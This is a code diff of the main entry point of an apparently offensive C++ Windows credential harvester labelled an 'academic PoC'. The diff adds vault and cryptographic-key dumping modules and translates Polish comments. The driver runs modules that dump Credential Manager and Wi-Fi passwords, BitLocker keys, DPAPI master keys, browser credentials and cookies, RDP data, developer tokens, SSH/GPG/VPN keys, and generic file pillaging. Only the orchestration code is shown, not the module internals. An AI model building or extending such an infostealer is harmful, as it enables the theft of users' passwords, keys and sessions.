@@ -2,51 +2,51 @@
 #include <windows.h>
 #include "SystemCredentialsDump.h"
 #include "DpapiMasterKeys.h"
+#include "VaultDump.h"
 #include "ChromiumDump.h"
-#include "ChromiumV20.h"
 #include "GeckoAndIECookies.h"
 #include "RdpDump.h"
 #include "DevCredentialsDump.h"
+#include "CryptoKeysDump.h"
 #include "Pillaging.h"
-#include "VaultDump.h"
 
 int main() {
     SetConsoleOutputCP(CP_UTF8);
 
     std::cout << "========================================================\n";
-    std::cout << "  Windows DPAPI & Security Credentials Abuse PoC Engine \n";
+    std::cout << "  Promiscuous-CredsHarvester — Academic PoC Engine      \n";
     std::cout << "========================================================\n";
 
-    // 1. Systemowe
+    // 1. Windows system credentials
     SystemCredentialsDump::DumpCredManager();
     SystemCredentialsDump::DumpWifiPasswords();
     SystemCredentialsDump::DecryptBitLockerAutoUnlock();
     SystemCredentialsDump::DumpEAPCertificates();
 
-    // 2. DPAPI Master Keys
+    // 2. DPAPI master keys
     DpapiMasterKeys::Dump();
 
-    // 3. Vault (Web + Windows Credentials)
+    // 3. Windows Vault metadata
     VaultDump::Run();
 
-    // 4. Chromium
+    // 4. Browsers
     ChromiumDump::Run();
-    ChromiumV20::Run();  // tylko z adminem
-
-    // 5. Gecko / IE
     GeckoAndIECookies::RunAll();
 
-    // 6. RDP
+    // 5. Remote access (RDP artefacts)
     RdpDump::Run();
 
-    // 7. Dev / CLI
+    // 6. Developer / CLI credentials (tokens, configs, sessions)
     DevCredentialsDump::Run();
 
-    // 8. Pillaging
+    // 7. Cryptographic key material (SSH, GPG, VPN, raw keys)
+    CryptoKeysDump::Run();
+
+    // 8. Generic file pillaging (catch-all)
     Pillaging::Run();
 
     std::cout << "\n========================================================\n";
-    std::cout << "[+] Execution has finished (finally) PoC.\n";
+    std::cout << "[+] Execution finished.\n";
 
     return 0;
 }
